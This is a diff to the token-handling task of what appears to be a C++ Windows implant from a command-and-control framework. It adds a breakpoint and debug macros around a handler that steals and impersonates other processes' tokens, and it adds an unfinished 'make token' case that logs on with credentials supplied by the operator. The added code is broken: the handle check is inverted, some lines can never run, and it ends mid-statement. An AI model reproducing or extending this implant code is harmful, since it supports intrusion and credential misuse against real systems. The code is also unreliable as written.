@@ -1158,6 +1158,9 @@ auto DECLFN Task::Token(
     PACKAGE* Package = Job->Pkg;
     PARSER*  Parser  = Job->Psr;
 
+    KhDbg("%p %d", Parser->Buffer, Parser->Length);
+    INT3BRK
+
     UINT8 SubID = Self->Psr->Int32( Parser );
 
     Self->Pkg->Byte( Package, SubID );
@@ -1168,17 +1171,7 @@ auto DECLFN Task::Token(
         case TknGetUUID: {
             CHAR*  ProcUser    = nullptr;
             CHAR*  ThreadUser  = nullptr;
-            HANDLE TokenHandle = Self->Tkn->CurrentPs();
-
-            ProcUser = Self->Tkn->GetUser( TokenHandle );
-
-            if ( ProcUser ) {
-                Self->Pkg->Str( Package, ProcUser );
-                Self->Hp->Free( ProcUser );
-                Self->Ntdll.NtClose( TokenHandle );
-
-                KhSetError( ERROR_SUCCESS );
-            }
+            HANDLE TokenHandle = nullptr;
 
             TokenHandle = Self->Tkn->CurrentThread();
             ThreadUser  = Self->Tkn->GetUser( TokenHandle );
@@ -1198,13 +1191,19 @@ auto DECLFN Task::Token(
             BOOL  TokenUse  = Self->Psr->Int32( Parser );
             BOOL  Success   = FALSE;
 
+            KhDbg("id: %d use: %s", ProcessID, TokenUse ? "true" : "false");
             TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );
+            KH_DBG_MSG
 
             if ( ! Token ) {
+                KH_DBG_MSG
                 Self->Pkg->Int32( Package, FALSE ); break;
+                KH_DBG_MSG
             }
 
             if ( TokenUse ) Self->Tkn->Use( Token->Handle );
+
+            KH_DBG_MSG
 
             Self->Pkg->Int32( Package, TRUE );
 
@@ -1234,6 +1233,21 @@ auto DECLFN Task::Token(
         }
         case TknRev2Self: {
             Self->Pkg->Int32( Package, Self->Tkn->Rev2Self() ); break;
+        }
+        case TknMake: {
+            CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
+            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
+            CHAR*  Password    = Self->Psr->Str( Parser, 0 );
+            HANDLE TokenHandle = nullptr;
+
+            LogonUserA( 
+                UserName, DomainName, Password, LOGON_NETCREDENTIALS_ONLY, LOGON32_PROVIDER_DEFAULT, &TokenHandle
+            );
+            if ( ! TokenHandle || TokenHandle != INVALID_HANDLE_VALUE ) {
+                break;
+            }
+
+            Self->Tkn.
         }
     }
 
